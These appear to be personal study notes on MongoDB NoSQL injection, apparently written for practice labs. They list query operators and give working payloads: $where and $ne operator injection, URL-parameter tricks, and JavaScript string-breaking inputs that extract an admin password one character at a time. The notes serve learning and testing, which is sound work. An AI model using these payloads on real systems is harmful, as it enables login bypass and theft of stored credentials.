# Introduction
- $where - Matches documents that satisfy a JavaScript expression.
```
{ $where: "this.age > 18" }
```
- $ne - Matches all values that are not equal to a specified value.
```
{ role: { $ne: "user" } }
```
- $in - Matches all of the values specified in an array.
```
{ category: { $in: ["Gifts", "Books"] } }
```
- $regex - Selects documents where values match a specified regular expression.
1. Indica que el valor empieza con adm: ```{ username: { $regex: "^adm" } }```
2. Indica que el valor acaba con in: ```{ username: { $regex: "in$" } }```

## Identifying use of query operators
Focused on the app response
```
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
It's allowed, we can try to extract data of 
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
## Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, ```{"username":"wiener"}``` becomes ```{"username":{"$ne":"invalid"}}```.

For URL-based inputs, you can insert query operators via URL parameters. For example, ```username=wiener``` becomes ```username[$ne]=invalid```. If this doesn't work, you can try the following:

1. Convert the request method from GET to POST.
2. Change the Content-Type header to application/json.
3. Add JSON to the message body.
4. Inject query operators in the JSON

# Exfiltrating data in MongoDB
```
admin' && this.username!=' 
admin' && this.password.length == 10 || 'a'=='b
admin' && this.password.match(/\d/) || 'a'=='b
admin' && this.password[0] == 'a' || 'a'=='b
```
